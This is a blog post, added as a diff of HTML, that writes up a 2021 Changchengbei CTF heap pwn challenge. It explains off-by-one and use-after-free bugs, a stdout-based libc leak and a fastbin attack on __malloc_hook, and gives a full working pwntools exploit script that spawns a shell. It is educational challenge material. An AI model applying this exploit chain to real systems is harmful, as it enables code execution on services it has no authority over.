@@ -1,0 +1,569 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0.ico">
+  <link rel="icon" href="/img/0.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sh0ve1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x0 前言2021年长城杯的一道pwn题，偏简单。 0x1 题目信息 使用libc-2.23.so(2.23-0ubuntu11.3)  file pwn   1pwn: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021长城杯-K1ng_in_h3Ap_I">
+<meta property="og:url" content="https://sh0ve1.github.io/2021/11/05/%E9%95%BF%E5%9F%8E%E6%9D%AF2021-K1ng-in-h3Ap-I/index.html">
+<meta property="og:site_name" content="sh0ve1&#39;s blog">
+<meta property="og:description" content="0x0 前言2021年长城杯的一道pwn题，偏简单。 0x1 题目信息 使用libc-2.23.so(2.23-0ubuntu11.3)  file pwn   1pwn: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sh0ve1.github.io/img/8.jpg">
+<meta property="article:published_time" content="2021-11-05T02:49:18.000Z">
+<meta property="article:modified_time" content="2022-03-26T10:44:45.851Z">
+<meta property="article:author" content="sh0ve1">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="fastbin attack">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://sh0ve1.github.io/img/8.jpg">
+  
+  
+  <title>2021长城杯-K1ng_in_h3Ap_I - sh0ve1&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"sh0ve1.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"pU0JQUaRtEv6Lgu0jxYpEBT9-gzGzoHsz","app_key":"2Gdcl19Uu0nQBNMs6fu6YiR4","server_url":"https://pu0jquar.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh0ve1&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post_1.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2021长城杯-K1ng_in_h3Ap_I">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-05 10:49" pubdate>
+        2021年11月5日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.6k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      39 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2021长城杯-K1ng_in_h3Ap_I</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>2021年长城杯的一道pwn题，偏简单。</p>
+<h2 id="0x1-题目信息"><a href="#0x1-题目信息" class="headerlink" title="0x1 题目信息"></a>0x1 题目信息</h2><ul>
+<li><p>使用libc-2.23.so(2.23-0ubuntu11.3)</p>
+</li>
+<li><p>file pwn</p>
+</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>, for GNU/Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span>, BuildID[sha1]=<span class="hljs-number">74</span>c8fe3648c3b483b0a5b43b23e24be1f130696c, stripped<br></code></pre></td></tr></table></figure>
+<ul>
+<li>checksec pwn</li>
+</ul>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x2-功能分析"><a href="#0x2-功能分析" class="headerlink" title="0x2 功能分析"></a>0x2 功能分析</h2><ul>
+<li>add: 由于可覆盖idx，所以可以申请任意个堆块，堆块大小限制为0~0xF0，申请成功之后就把地址和堆块大小分别存储在两个数组中；</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">_DWORD *add()<br>&#123;<br>  _DWORD *result; <span class="hljs-regexp">//</span> rax<br>  int idx; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">8</span>h]<br>  int size; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">10</span> )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  puts(<span class="hljs-string">&quot;input size:&quot;</span>);<br>  size = get_Int();<br>  <span class="hljs-keyword">if</span> ( size &lt; <span class="hljs-number">0</span> || size &gt; <span class="hljs-number">0</span>xF0 )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  heap_array[idx] = malloc(size);<br>  result = size_array;<br>  size_array[idx] = size;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>edit：根据index找到堆块地址和堆块大小，然后写入内容，输入函数存在<code>off-by-one</code>漏洞</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">__int64 edit()<br>&#123;<br>  int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> || !heap_array[idx] )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  puts(<span class="hljs-string">&quot;input context:&quot;</span>);<br>  return Read(heap_array[idx], (unsigned int)size_array[idx]);<span class="hljs-regexp">//</span> off-by-one<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>delete：根据index找到堆块地址，然后释放，没有将指针置为0，存在<code>UAF</code>漏洞</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">void <span class="hljs-keyword">delete</span>()<br>&#123;<br>  int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">10</span> || !*((_QWORD *)&amp;heap_array + idx) || !size_array[idx] )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  free(*((void **)&amp;heap_array + idx));          <span class="hljs-regexp">//</span> UAF<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>magic：打印出printf函数地址的后三字节</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">magic</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> __int64)&amp;printf &amp; <span class="hljs-number">0xFFFFFF</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ul>
+<li>由于没有输出函数，所以无法通过<code>UAF</code>来泄露<code>main_arena + offset</code>，从而获取libcbase，考虑利用<code>stdout</code>来泄露libc；</li>
+<li>根据<code>printf</code>函数（在libc中）地址的后三位，我们可以根据固定偏移量推算出libc中<code>stdout</code>的地址；</li>
+<li>当堆块释放到<code>unsorted bin</code>中时，fd和bk都是<code>main_arena + offset</code>，此时我们利用<code>UAF</code>漏洞修改fd的低2字节（调试发现<code>main_arena</code>的地址和<code>stdout</code>的地址只有最好两字节有差异）为<code>stdout-0x43</code>的地址即可（需要满足size检测）；</li>
+<li>再次申请堆块获取<code>stdout</code>的控制权限,修改flags&#x3D;0xfbad1800，<code>_IO_read_ptr</code>，<code>_IO_read_base</code>和<code>_IO_read_end</code>为0，即可泄露出关于libc的地址；</li>
+<li>然后使用<code>UAF</code>和<code>fastbin attack</code>来修改<code>__malloc_hook</code>和<code>__realloc_hook</code>为<code>realloc</code>和<code>one_gadget</code>。</li>
+</ul>
+<h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :fastbin attack ==&gt; stdout泄露libcbase; UAF ==&gt; fastbin attack to malloc_hook realloc_hook</span><br><span class="hljs-string">             好像无需知道printf部分地址也行，因为main_arena应该与stdout的偏移也应该是固定的</span><br><span class="hljs-string">@时间        :2021/09/27 16:59:14</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn import *<br>import pwnlib<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>def <span class="hljs-built_in">add</span>(idx, sz):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, str(1))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:&#x27;</span>, str(idx))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input size:&#x27;</span>, str(sz))<br><br>def delete(idx):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, str(2))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:&#x27;</span>, str(idx))<br><br>def <span class="hljs-built_in">edit</span>(idx, ct):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, str(3))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:&#x27;</span>, str(idx))<br>    p.sendafter(<span class="hljs-string">&#x27;input context:&#x27;</span>, ct)<br><br>def magic():<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, str(666))<br><br>magic()<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>printf_last_3_Bytes = int(p.recv(6),16)<br>stdout_last_3_Bytes = printf_last_3_Bytes + 0x36fe10<br><br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;printf_last_3_Bytes: &quot;</span> + hex(printf_last_3_Bytes))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;stdout_last_3_Bytes: &quot;</span> + hex(stdout_last_3_Bytes))<br><br><span class="hljs-built_in">add</span>(0,0x18)<br><span class="hljs-built_in">add</span>(1,0x20)<br><span class="hljs-built_in">add</span>(2,0x60)<br><span class="hljs-built_in">add</span>(3,0x10)<br><span class="hljs-built_in">edit</span>(0,b<span class="hljs-string">&#x27;A&#x27;</span><span class="hljs-number">*0</span>x18 + b<span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>delete(1)<br>delete(2)<br><span class="hljs-built_in">add</span>(1,0x20)<br><span class="hljs-built_in">edit</span>(2,p16((stdout_last_3_Bytes&amp;0xffff)-0x43) + b<span class="hljs-string">&#x27;\n&#x27;</span>) #必须设置为stdout前0x43字节，才能满足size要求<br><br><span class="hljs-built_in">add</span>(2,0x60)<br><span class="hljs-built_in">add</span>(4,0x60) # <span class="hljs-attribute">idx</span>=4 指向stdout-0x33  <br><br><span class="hljs-comment">#本题中，修改flags为0xfbad1800之后，后面的就没输入进去了？</span><br>payload = b<span class="hljs-string">&#x27;\x00&#x27;</span><span class="hljs-number">*0</span>x33 + p64(0xfbad1800) + p64(0)<span class="hljs-number">*3</span> + b<span class="hljs-string">&#x27;\x00&#x27;</span> + b<span class="hljs-string">&#x27;\n&#x27;</span> <br><span class="hljs-built_in">edit</span>(4,payload)<br><br>libc.address = u64(p.recvuntil(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))-0x3c5600<br>realloc = libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>] # __libc_realloc<br>__malloc_hook = libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one = [0x45226,0x4527a,0xf03a4,0xf1247]<br>onegadget = libc.address + one[1]<br><br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;libc.address: &quot;</span> + hex(libc.address))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;realloc: &quot;</span> + hex(realloc))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;__malloc_hook: &quot;</span> + hex(__malloc_hook))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;onegadget: &quot;</span> + hex(onegadget))<br><br>delete(2)<br><span class="hljs-built_in">edit</span>(2,p64(__malloc_hook - 0x23) + b<span class="hljs-string">&#x27;\n&#x27;</span>) # UAF<br><span class="hljs-built_in">add</span>(5,0x60)<br><span class="hljs-built_in">add</span>(6,0x60) # <span class="hljs-attribute">idx</span>=6 指向 __malloc_hook - 0x23<br><br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*(0x13 - 8) + p64(onegadget) + p64(realloc+12) + b<span class="hljs-string">&#x27;\n&#x27;</span><br><span class="hljs-built_in">edit</span>(6,payload)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p,&quot;b __libc_malloc&quot;)</span><br><br><span class="hljs-built_in">add</span>(7,0x10) #触发<br><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x5-Rference"><a href="#0x5-Rference" class="headerlink" title="0x5 Rference"></a>0x5 Rference</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/27152c14e2e7">https://www.jianshu.com/p/27152c14e2e7</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF-WriteUp/">CTF-WriteUp</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/heap/">heap</a>
+                    
+                      <a class="hover-with-bg" href="/tags/UAF/">UAF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/fastbin-attack/">fastbin attack</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/06/%E9%95%BF%E5%9F%8E%E6%9D%AF2021-K1ng-in-h3Ap-II/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2021长城杯-K1ng_in_h3Ap_II</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/04/starCTF2021-babyheap/">
+                        <span class="hidden-mobile">starCTF2021-babyheap</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"2GYV17CUmss2VIOWS1MFpfqj-gzGzoHsz","appKey":"0R4wcvymx9kXQiyeaw8t2otu","path":"window.location.pathname","placeholder":"说点什么吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/RunData.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
